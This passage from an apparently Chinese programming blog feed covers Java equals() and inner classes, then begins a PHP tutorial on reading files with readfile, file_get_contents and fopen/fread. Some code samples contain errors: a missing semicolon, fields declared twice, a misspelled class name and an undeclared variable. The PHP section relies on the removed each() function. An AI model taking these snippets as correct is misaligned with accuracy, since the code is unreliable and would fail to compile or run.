class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">equals示例2：</span><br><span class="line">import java.util.*;</span><br><span class="line">public class EqualsTest &#123;</span><br><span class="line">     public <span class="function"><span class="title">EqualsTest</span></span>() &#123;    &#125;    </span><br><span class="line">     public static void main(String[] args)&#123;</span><br><span class="line">     Employee alice1=new Employee(<span class="string">&quot;Alice&quot;</span>,75000,1987,12,15);</span><br><span class="line">     Employee alice2=alice1;</span><br><span class="line">     Employee alice3=new Employee(<span class="string">&quot;Alice&quot;</span>,75000,1987,12,15);</span><br><span class="line">     Employee bob=new Employee(<span class="string">&quot;Bob&quot;</span>,50000,1989,10,1);</span><br><span class="line">     System.out.println(<span class="string">&quot;alice1==alice2: &quot;</span>+(alice1==alice2));    //<span class="literal">true</span></span><br><span class="line">     System.out.println(<span class="string">&quot;alice1==alice3: &quot;</span>+(alice1==alice3));    //<span class="literal">false</span> </span><br><span class="line">     System.out.println(<span class="string">&quot;alice1.equals(alice3): &quot;</span>+alice1.equals(alice3));  //<span class="literal">true</span></span><br><span class="line">     System.out.println(<span class="string">&quot;alice1.equals(bob): &quot;</span>+alice1.equals(bob));   //<span class="literal">false</span> </span><br><span class="line">     System.out.println(<span class="string">&quot;bob.toString(): &quot;</span>+bob);  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Employee&#123;</span><br><span class="line">    private String name;</span><br><span class="line">    private double salary;</span><br><span class="line">    private Date hireDay; </span><br><span class="line">    public Employee(String n,double s,int year,int month,int day)&#123;</span><br><span class="line">            name=n;</span><br><span class="line">            salary=s</span><br><span class="line">        hireDay=new Date(year,month,day);</span><br><span class="line">    &#125;</span><br><span class="line">    public String <span class="function"><span class="title">getName</span></span>()&#123;     <span class="built_in">return</span> name;     &#125;</span><br><span class="line">    public double <span class="function"><span class="title">getSalary</span></span>()&#123;   <span class="built_in">return</span> salary;    &#125;</span><br><span class="line">    public Date <span class="function"><span class="title">getHireDay</span></span>()&#123;   <span class="built_in">return</span> hireDay; &#125;</span><br><span class="line">    public void raiseSalary(double byPercent)&#123;</span><br><span class="line">            double raise=salary*byPercent/100;</span><br><span class="line">            salary+=raise;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">public boolean equals(Object otherObject)&#123;     //子类覆盖了Object的equals方法</span><br><span class="line">  <span class="keyword">if</span>(this==otherObject) <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">if</span>(otherObject==null) <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">if</span>(getClass()!=otherObject.getClass())</span><br><span class="line">  <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">  Employee other=(Employee)otherObject;</span><br><span class="line">  <span class="built_in">return</span> name.equals(other.name)&amp;&amp;</span><br><span class="line">              salary==other.salary&amp;&amp;hireDay.equals(other.hireDay); </span><br><span class="line">                        //子类覆盖了Object的toString方法</span><br><span class="line"> &#125;</span><br><span class="line"> public String <span class="function"><span class="title">toString</span></span>()&#123;</span><br><span class="line">  <span class="built_in">return</span> getClass().getName()+</span><br><span class="line">           <span class="string">&quot;[name=&quot;</span>+name+<span class="string">&quot;,salary=&quot;</span>+salary+<span class="string">&quot;,hireDay=&quot;</span>+hireDay+<span class="string">&quot;]&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> private String name;</span><br><span class="line"> private double salary;</span><br><span class="line"> private Date hireDay;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="二、-内部类"><a href="#二、-内部类" class="headerlink" title="二、 内部类"></a><font color="#FF6347" face="Comic sans MS">二、 内部类</font></h3><h4 id="2-1-内部类的定义与使用"><a href="#2-1-内部类的定义与使用" class="headerlink" title="2.1  内部类的定义与使用"></a><font color="#20B2AA" face="Comic sans MS">2.1  内部类的定义与使用</font></h4><p><font face="Comic sans MS"><font color="red"><strong>1. 📒内部类的定义：</strong></font>将类的定义置入一个用于封装它的类（外部类）里。<br>    <font color="#00B2EE"><strong>注意：</strong></font><br>    内部类不能与外部类同名（否则，编译器无法区分内部类与外部类），如果内部类还有内部类，内部类的内部类不能与它的任何一层外部类同名。<br>    <font color="#00B2EE"><strong>作用：</strong></font><br>    逻辑分组, 隐藏细节<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/*内部类结合多态可以很方便的隐藏类的细节(包括类名)</span><br><span class="line">*/</span><br><span class="line">interface Contents&#123;</span><br><span class="line">  int value();</span><br><span class="line">&#125;</span><br><span class="line">interface Destination &#123;</span><br><span class="line">  String readLabel();</span><br><span class="line">&#125;</span><br><span class="line">class Goods&#123;</span><br><span class="line">    private class Content implements Contents&#123;  //<span class="string">&quot;private class Contentimplements Contents&quot;</span> </span><br><span class="line">        private int i=11;</span><br><span class="line">        public int <span class="function"><span class="title">value</span></span>()&#123;</span><br><span class="line">  <span class="built_in">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">    protected class GDestination    //<span class="string">&quot;protected class GDestination implements Destination&quot;</span></span><br><span class="line">    implements Destination&#123;</span><br><span class="line">      private String label;</span><br><span class="line">  private GDestination(String whereTo)&#123;</span><br><span class="line">    label=whereTo;</span><br><span class="line">  &#125;</span><br><span class="line">public String <span class="function"><span class="title">readLabel</span></span>()&#123;</span><br><span class="line">    <span class="built_in">return</span> label;&#125;&#125;</span><br><span class="line">public Contents <span class="function"><span class="title">cont</span></span>()&#123;</span><br><span class="line">  <span class="built_in">return</span> new Content();</span><br><span class="line">  &#125;</span><br><span class="line">public Destination dest(String s)&#123;</span><br><span class="line">  <span class="built_in">return</span> new GDestination(s);</span><br><span class="line">  &#125;</span><br><span class="line">  &#125;</span><br><span class="line">public class TestGoods &#123;   //<span class="string">&quot;public class TestGoods&quot;</span></span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">         Goods g=new Goods();</span><br><span class="line">         Contents c=g.cont();</span><br><span class="line">         Destination d=g.dest(<span class="string">&quot;Beijing&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font face="Comic sans MS"><font color="red"><strong>2. 📒内部类对象的创建：</strong></font>创建非静态内部类的对象时一定要确保已经有一个外部类对象。<br>(1) 利用外部类的方法创建并返回，因为方法是由外部类对象调用的，那创建该内部类对象时，一定已经拥有了所属的外部类对象了<br>public Contents cont(){  &amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;       Goods g&#x3D;new Goods();<br>  return new Content();  &amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;ensp;        Contents c&#x3D;g.cont();<br>}</p>
<p>(2) 创建内部类还可以在除外部类中的其它类中，但是要确保该类具有访问内部类的权限，并且已经创建了一个外部类对象。格式如下：<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">outerObject=new outerClass(Constructor Parameters);</span><br><span class="line">outerClass.innerClass innerObject = outerObject.new InnerClass(Constructor Parameters);</span><br><span class="line"></span><br><span class="line"> Goods g1=new Goods();</span><br><span class="line"> Goods.Content c1=g.new Content(); </span><br><span class="line">OR</span><br><span class="line"> Goods g1=new Goods();</span><br><span class="line"> Goods.GDestination d1=g1.new GDestionation(); </span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>3. 📒内部类的修饰符：</strong></font><br>（1）<font color="red"><strong>public、protected、private和缺省：</strong></font>访问权限修饰符，用来限定内部类的访问权限，<br>  &amp;emsp;&amp;emsp;一般的外部类是不能用protected和private修饰的。访问权限修饰符的限定和成员变量的限定一样。<br>（2）<font color="red"><strong>final:</strong></font>表明内部类不能继承。<br>（3）<font color="red"><strong>abstract：</strong></font>抽象内部类，不能被实例化。<br>（4）<font color="red"><strong>static：</strong></font>表明一个静态内部类。</p>
<p><font face="Comic sans MS"><font color="red"><strong>4. 📒静态内部类：</strong></font><br><strong>和普通的非静态内部类有较大的不同，使用时要遵循如下原则：</strong><br>（1）实例化static内部类时，在new前面不需要用对象变量；<br><font color="red"><strong>（2）static内部类中不能访问其外部类的非static属性及方法，即只能访问static成员；<br>（3）static方法中不能访问非static的属性及方法，也不能不带前缀地new一个非static的内部类。</strong></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">class A</span><br><span class="line">&#123;</span><br><span class="line">      private int x;</span><br><span class="line">      void <span class="function"><span class="title">m</span></span>()&#123;</span><br><span class="line">  new B();</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     static void <span class="function"><span class="title">sm</span></span>()&#123;</span><br><span class="line">      //在外部类的静态方法中</span><br><span class="line">     //不能直接创建内部类对象</span><br><span class="line">     //new B();//!!error</span><br><span class="line">    &#125;</span><br><span class="line">class B</span><br><span class="line">&#123;</span><br><span class="line">      <span class="function"><span class="title">B</span></span>()&#123;x=5;&#125;</span><br><span class="line">  &#125;//B类结束</span><br><span class="line">&#125;//A类结束</span><br><span class="line">class Outer</span><br><span class="line">&#123;</span><br><span class="line">  static class Inner</span><br><span class="line">  &#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class TestInnerStatic</span><br><span class="line">&#123;</span><br><span class="line">  public static void main(String[] args)  </span><br><span class="line">  &#123;</span><br><span class="line">    //创建非静态内部类B的对象a_b和ab</span><br><span class="line">    A.B a_b=new A().new B();</span><br><span class="line">    A a=new A();</span><br><span class="line">    A.B ab=a.new B();</span><br><span class="line">    </span><br><span class="line">    //创建静态内部类Inner的对象oi，不需要外部类Outer的对象</span><br><span class="line">    Outer.Inner oi=new Outer.Inner();</span><br><span class="line">    //Outer.Inner oi2=Outer.new Inner();//!!error</span><br><span class="line">    //Outer.Inner oi3=new Outer().new Inner();//!!error</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>5. 📒内部类中访问外部类的成员：</strong></font><br>(1) 内部类中是可以直接访问外部类的其他属性与方法的，即使它们是private的。<br>(2) 如果内部类中有与外部类同名的属性与方法，可以使用下面的格式来表达外部类的引用，从而区分外部类和内部类的同名的属性与方法：<br>                       outerClass.this<br></font> </p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="2-2-方法和作用域中的内部类"><a href="#2-2-方法和作用域中的内部类" class="headerlink" title="2.2  方法和作用域中的内部类"></a><font color="#20B2AA" face="Comic sans MS">2.2  方法和作用域中的内部类</font></h4><p><font face="Comic sans MS"><font color="red"><strong>内部类也可以是局部的，它可以定义在一个方法甚至一个代码块之内。</strong></font><br>(1) 内部类中是可以直接访问外部类的其他属性与方法的，即使它们是private的。<br>(2) 如果内部类中有与外部类同名的属性与方法，可以使用下面的格式来表达外部类的引用，从而区分外部类和内部类的同名的属性与方法：<br>                       outerClass.this<br></font> </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">例1: 方法中的内部类:</span><br><span class="line">interface Destination &#123;</span><br><span class="line">  String readLabel();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public class Goods2 &#123;</span><br><span class="line">  String a=<span class="string">&quot;Goods2&quot;</span>;</span><br><span class="line">     public Destination dest(String s) &#123;</span><br><span class="line">          class GDestination implements Destination &#123;</span><br><span class="line">            private String label;</span><br><span class="line">            private GDestination(String whereTo) &#123;</span><br><span class="line">             label = whereTo;</span><br><span class="line">             System.out.println(<span class="string">&quot;access outer class:&quot;</span>+a);</span><br><span class="line">               &#125;</span><br><span class="line">               public String <span class="function"><span class="title">readLabel</span></span>() &#123; <span class="built_in">return</span> label; &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="built_in">return</span> new GDestination(s);</span><br><span class="line">     &#125;</span><br><span class="line">public static void main(String[] args) &#123;</span><br><span class="line">          Goods2 g= new Goods2();</span><br><span class="line">          Destination d = g.dest(<span class="string">&quot;Beijing&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">&#125;</span><br><span class="line">/*在方法dest（）中定义了一个内部类，最后由这个方法返回这个内部类的对象。如果在用一个内部类的时候仅需要创建它的一个对象并传给外部，就可以这样做。</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>方法中定义内部类的注意点:</strong></font><br> (1) 方法中定义的类，在其它地方使用时，没有类的名字，一般用其父类来引用这样的变量。<br> (2) 同局部变量一样，方法中的内部类前面不能用public，private，protected修饰，也不能用static修饰，但可以被final或abstract修饰。<br> (3) 方法中的内部类，可以访问其外部类的成员;若是static方法中的内部类，可以访问外部类的static成员。<br> (4) 方法中的内部类中，不能访问该方法的局部变量，除非是final的局部变量。<br></font></p>
<p>&amp;emsp;</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">例2: 作用域中的内部类:</span><br><span class="line">public class Goods3&#123;</span><br><span class="line">     private void internalTracking(boolean b) &#123;</span><br><span class="line">          <span class="keyword">if</span>(b) &#123;</span><br><span class="line">               class TrackingSlip &#123;</span><br><span class="line">                    private String id;</span><br><span class="line">                    TrackingSlip(String s) &#123;</span><br><span class="line">                         id = s;</span><br><span class="line">                    &#125;</span><br><span class="line">                    String <span class="function"><span class="title">getSlip</span></span>() &#123; <span class="built_in">return</span> id; &#125;</span><br><span class="line">               &#125;</span><br><span class="line">              TrackingSlip ts = new TrackingSlip(<span class="string">&quot;slip&quot;</span>);</span><br><span class="line">               String s = ts.getSlip();</span><br><span class="line">          &#125; </span><br><span class="line">     &#125;</span><br><span class="line"> public void <span class="function"><span class="title">track</span></span>() &#123; internalTracking(<span class="literal">true</span>); &#125;</span><br><span class="line">     public static void main(String[] args) &#123;</span><br><span class="line">          Goods3 g= new Goods3();</span><br><span class="line">          g.track();</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="2-3-匿名内部类"><a href="#2-3-匿名内部类" class="headerlink" title="2.3  匿名内部类 "></a><font color="#20B2AA" face="Comic sans MS">2.3  匿名内部类 </font></h4><p><font face="Comic sans MS"><font color="red"><strong>匿名类：</strong></font> 类或方法中定义的一种没有类名的特殊内部类。<br><font color="red"><strong>作用：</strong></font>当需要创建一个类的对象而且用不上它的名字时，使用内部类可以使代码看上去简洁清楚。<br><font color="red"><strong>语法规则如下：</strong></font><br>       new interfacename(){……};<br>      或new superclassname(){……};</p>
<p><font color="red"><strong>注意：</strong></font><br> (1) 这种类不取名字，而直接用其父类的名字或者它所实现的接口的名字；<br> (2) 类的定义与创建该类的一个对象同时进行，即类的定义前面有一个new，没有类的首部，对象的创建和类体共同构成一个匿名类表达式，后面以“;”结束；<br> (3) 类中不能定义构造方法，因为它没有名字。<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">interface Contents&#123;</span><br><span class="line">  int value();</span><br><span class="line">&#125;</span><br><span class="line">public class Goods4 &#123;</span><br><span class="line">     public Contents <span class="function"><span class="title">cont</span></span>()&#123;</span><br><span class="line">          //返回匿名类对象，该匿名类继承了Contents接口</span><br><span class="line">          <span class="built_in">return</span> new <span class="function"><span class="title">Contents</span></span>()&#123;</span><br><span class="line">               private int i = 11;</span><br><span class="line">               public int <span class="function"><span class="title">value</span></span>() &#123; </span><br><span class="line">                    <span class="built_in">return</span> i; </span><br><span class="line">               &#125;</span><br><span class="line">          &#125;;</span><br><span class="line">     &#125;</span><br><span class="line"> public static void main(String[] args)</span><br><span class="line">     &#123;</span><br><span class="line">      Goods4 g=new Goods4();</span><br><span class="line">      Contents c=g.cont();</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<hr>
<p>&amp;emsp;<br>&amp;emsp;<br>&amp;emsp;<br>&amp;emsp;</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java学习</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP-文件系统</title>
    <url>/post/PHP-FileSystem/</url>
    <content><![CDATA[<p>学习文件处理本质上面就是学习<font color="#00B2EE"><strong>文件处理的函数。</strong></font> ヾ(๑╹◡╹)ﾉ”</p>
<span id="more"></span>

<p>&amp;ensp;<br>&amp;ensp;</p>
<center><font color="#00B2EE" face="Comic sans MS" size=5>PHP 文件系统</font></center>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="一-读取文件"><a href="#一-读取文件" class="headerlink" title="一. 读取文件"></a><font color="#FF6347" face="Comic sans MS">一. 读取文件</font></h3><p>&amp;emsp;</p>
<h4 id="1-1-readfile读取文件"><a href="#1-1-readfile读取文件" class="headerlink" title="1.1 readfile读取文件"></a><font color="#3CB371" face="Comic sans MS">1.1 readfile读取文件</font></h4><p>读取一个文件内容的函数：<font color="#00B2EE" face="Comic sans MS"><strong>int readfile ( string $文件名)</strong></font></p>
<blockquote>
<p><font color="#FF7F00"><strong>功能：传入一个文件路径，输出这个文件里面的内容。</strong></font></p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   //linux类的读取方式</span><br><span class="line">   readfile(<span class="string">&quot;/home/paul/test.txt&quot;</span>);</span><br><span class="line">   //windows类的读取方式</span><br><span class="line">   readfile(<span class="string">&quot;c:\\boot.ini&quot;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>注意：</strong>上面的代码中windows的斜线是\斜线，可能会转义掉一些字符。因此，我们写的时候写上两个斜线。</p>
</blockquote>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-2-file-get-contents打开文件"><a href="#1-2-file-get-contents打开文件" class="headerlink" title="1.2 file_get_contents打开文件"></a><font color="#3CB371" face="Comic sans MS">1.2 file_get_contents打开文件</font></h4><p><font face="Comic sans MS">上面的是单纯打文件就直接输出了，有没有打开文件后，能够赋值给一个变量的操作方式呢。</font><br><font color="#00B2EE" face="Comic sans MS"><strong>string file_get_contents ( string filename)</strong></font></p>
<blockquote>
<p><font color="#FF7F00"><strong>功能：传入一个文件或文件路径，打开这个文件<font color="#00B2EE">返回</font>文件的内容。文件的内容是一个字符串。</strong></font></p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">   <span class="variable">$filename</span> = <span class="string">&#x27;NoAlike.txt&#x27;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="variable">$filestring</span> = file_get_contents(<span class="variable">$filename</span>);</span><br><span class="line">   <span class="built_in">echo</span> <span class="variable">$filestring</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>上面的代码，就打开了一个文件，并且将文件当中的内容进行了输出。</p>
</blockquote>
<p>&amp;emsp;<br>我们来针对之前的知识把代码进行一下扩展。用一用之前的知识点。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="comment">//假设我们有一个多行的文件叫NoAlike.txt，没有的话你可以新建一个这个文件</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&#x27;NoAlike.txt&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="comment">//打开这个文件，将文件内容赋值给$filestring</span></span><br><span class="line">   <span class="variable">$filestring</span> = file_get_contents(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">//因为每一行有一个回车即\n，我用\n来把这个字符串切割成数组</span></span><br><span class="line">   <span class="variable">$filearray</span> = explode(<span class="string">&quot;\n&quot;</span>, <span class="variable">$filestring</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">//把切割成的数组，下标赋值给$key,值赋值给$val，每次循环将$key加1。</span></span><br><span class="line">   <span class="keyword">while</span> (<span class="keyword">list</span>(<span class="variable">$key</span>, <span class="variable">$val</span>) = each(<span class="variable">$filearray</span>)) &#123;</span><br><span class="line">       ++<span class="variable">$key</span>;</span><br><span class="line">       <span class="variable">$val</span> = trim(<span class="variable">$val</span>);</span><br><span class="line"></span><br><span class="line">       <span class="comment">//用的单引号，单引号不解释变量进行了拼接而已</span></span><br><span class="line">       <span class="keyword">print</span> <span class="string">&#x27;Line&#x27;</span> . <span class="variable">$key</span> .<span class="string">&#x27;:&#x27;</span>.  <span class="variable">$val</span>.<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS">上述的<font color="#00B2EE">explode()、list()</font>两个字符串函数和<font color="#00B2EE">each()</font>数组函数。<br><font color="red"><strong>1. explode()函数：</strong></font><strong>把字符串打散为数组</strong>。</font><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_string_explode.asp">PHP explode() 函数</a>]</font>&amp;emsp;<font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/php_ref_string.asp">PHP String 函数</a>]</font><br>语法：explode(separator,string,limit)<br><font color="red"></font></p>
<table>
<thead>
<tr>
<th align="center">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">separator</td>
<td align="left">必需。规定在哪里分割字符串。</td>
</tr>
<tr>
<td align="center">string</td>
<td align="left">必需。要分割的字符串。</td>
</tr>
<tr>
<td align="center">limit</td>
<td align="left">可选。规定所返回的数组元素的数目。<br>可能的值：<br>大于 0 - 返回包含最多 limit 个元素的数组<br>小于 0 - 返回包含除了最后的 -limit 个元素以外的所有元素的数组<br>0 - 返回包含一个元素的数组</td>
</tr>
</tbody></table>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>2. list()函数：</strong></font><strong>把数组中的值赋给一些变量,在一次操作中给一组变量赋值。</strong></font><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_array_list.asp">PHP list() 函数</a>]</font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$my_array</span> = <span class="keyword">array</span>(<span class="string">&quot;Dog&quot;</span>,<span class="string">&quot;Cat&quot;</span>,<span class="string">&quot;Horse&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">list</span>(<span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>) = <span class="variable">$my_array</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;I have several animals, a <span class="subst">$a</span>, a <span class="subst">$b</span> and a <span class="subst">$c</span>.&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>3. each()函数：</strong></font><strong>返回当前元素的键名和键值。该元素的键名和键值返回到带有四个元素的数组中。<br>两个元素（1 和 Value）包含键值，两个元素（0 和 Key）包含键名。</strong></font><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_array_each.asp">PHP each() 函数</a>]</font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$people</span> = <span class="keyword">array</span>(<span class="string">&quot;Bill&quot;</span>, <span class="string">&quot;Steve&quot;</span>, <span class="string">&quot;Mark&quot;</span>, <span class="string">&quot;David&quot;</span>);</span><br><span class="line">var_dump(each(<span class="variable">$people</span>));</span><br><span class="line">var_dump(each(<span class="variable">$people</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">G:\WAMP\www\<span class="number">2</span>-<span class="number">20</span>-<span class="number">1</span>.php:<span class="number">3</span>:</span><br><span class="line"><span class="keyword">array</span> (size=<span class="number">4</span>)</span><br><span class="line">  <span class="number">1</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;Bill&#x27;</span> (length=<span class="number">4</span>)</span><br><span class="line">  <span class="string">&#x27;value&#x27;</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;Bill&#x27;</span> (length=<span class="number">4</span>)</span><br><span class="line">  <span class="number">0</span> =&gt; <span class="keyword">int</span> <span class="number">0</span></span><br><span class="line">  <span class="string">&#x27;key&#x27;</span> =&gt; <span class="keyword">int</span> <span class="number">0</span></span><br><span class="line">G:\WAMP\www\<span class="number">2</span>-<span class="number">20</span>-<span class="number">1</span>.php:<span class="number">4</span>:</span><br><span class="line"><span class="keyword">array</span> (size=<span class="number">4</span>)</span><br><span class="line">  <span class="number">1</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;Steve&#x27;</span> (length=<span class="number">5</span>)</span><br><span class="line">  <span class="string">&#x27;value&#x27;</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;Steve&#x27;</span> (length=<span class="number">5</span>)</span><br><span class="line">  <span class="number">0</span> =&gt; <span class="keyword">int</span> <span class="number">1</span></span><br><span class="line">  <span class="string">&#x27;key&#x27;</span> =&gt; <span class="keyword">int</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-3-fopen、fread、fclose操作读取文件"><a href="#1-3-fopen、fread、fclose操作读取文件" class="headerlink" title="1.3 fopen、fread、fclose操作读取文件"></a><font color="#3CB371" face="Comic sans MS">1.3 fopen、fread、fclose操作读取文件</font></h4><p>上面file_get_contents打开文件的方式简单、粗暴。下面的<br><font face="Comic sans MS"><font color="#00B2EE"><strong>resource fopen ( string $文件名, string 模式)<br>string fread ( resource $操作资源, int 读取长度)<br>bool fclose ( resource $操作资源 )</strong></font></p>
<p>通过上面的函数我们来讲解<strong>资源类型</strong>的通常操作方式：<br>1.打开资源<br>2.使用相关函数进行操作<br>3.关闭资源<br>&amp;emsp;<br><font color="red"><strong>1. fopen函数：</strong></font><strong>打开文件，返回一个资源</strong><br>参数主要有两个：1.文件打开的路径，2.打开文件的模式<br>例：$fp&#x3D;fopen(‘NoAlike.txt’, “r”);<br></font></p>
<blockquote>
<p><strong>返回类型是一个资源类型。<br>资源类型需要其他的函数来操作这个资源。</strong><font color="#FF7F00"><strong>所有的资源有打开就要有关闭。</strong></font></p>
</blockquote>
<p><font face="Comic sans MS"><font color="red"><strong>2. fread函数：</strong></font><strong>读取打开的文件资源。</strong><br>也包含两个参数，读取指定长度的文件资源，读取一部份向后移动一部份。至到文件结尾。<br>例：$contents &#x3D; fread($fp, 1024);<br></font></p>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>3. fclose函数：</strong></font><strong>fclose函数的功能是关闭资源。资源有打开就有关闭。</strong><br>包含一个参数，这个参数就是fopen()返回的资源。<br>例：fclose($fp);<br></font> </p>
<p>&amp;emsp;<br><font color="#FF7F00"><strong>fopen的模式</strong></font>有下面几个(。・∀・)ノ<br><font color="red"></font></p>
<table>
<thead>
<tr>
<th align="center">模式</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">r</td>
<td align="left">只读方式打开，将文件指针指向文件头。</td>
</tr>
<tr>
<td align="center">r+</td>
<td align="left">读写方式打开，将文件指针指向文件头。</td>
</tr>
<tr>
<td align="center">w</td>
<td align="left">写入方式打开，将文件指针指向文件头并将文件大小截为零。如果文件不存在则尝试创建</td>
</tr>
<tr>
<td align="center">w+</td>
<td align="left">读写方式打开，将文件指针指向文件头并将文件大小截为零。如果文件不存在则尝试创建</td>
</tr>
<tr>
<td align="center">a</td>
<td align="left">写入方式打开，将文件指针指向文件末尾。如果文件不存在则尝试创建</td>
</tr>
<tr>
<td align="center">a+</td>
<td align="left">读写方式打开，将文件指针指向文件末尾。如果文件不存在则尝试创建之</td>
</tr>
<tr>
<td align="center">x</td>
<td align="left">创建并以写入方式打开，将文件指针指向文件头。如果文件已存在，则 fopen() 调用失败并返回<br> FALSE，并生成一条 E_WARNING 级别的错误信息。如果文件不存在则尝试创建</td>
</tr>
<tr>
<td align="center">x+</td>
<td align="left">创建并以读写方式打开，将文件指针指向文件头。如果文件已存在，则 fopen() 调用失败并返回 <br>FALSE，并生成一条 E_WARNING 级别的错误信息。如果文件不存在则尝试创建</td>
</tr>
</tbody></table>
<p>&amp;emsp;<br><font color="#00B2EE"><strong>r模式示例：</strong></font><br>1.打开文件：fopen()<br><font color="red"></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="comment">//你可以创建一个NoAlike.txt，以只读模式打开</span></span><br><span class="line">   <span class="variable">$fp</span> = fopen(<span class="string">&#x27;NoAlike.txt&#x27;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="comment">//var_dump()操作一下$fp看看效果，输出的是不是只有类型提示的是resource</span></span><br><span class="line">   var_dump(<span class="variable">$fp</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>2.读取文件：fread()<br><font color="red"></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="variable">$fp</span> = fopen(<span class="string">&#x27;NoAlike.txt&#x27;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">//打开一个文件类型后，读取长度</span></span><br><span class="line">   <span class="variable">$contents</span> = fread(<span class="variable">$fp</span>, <span class="number">1024</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

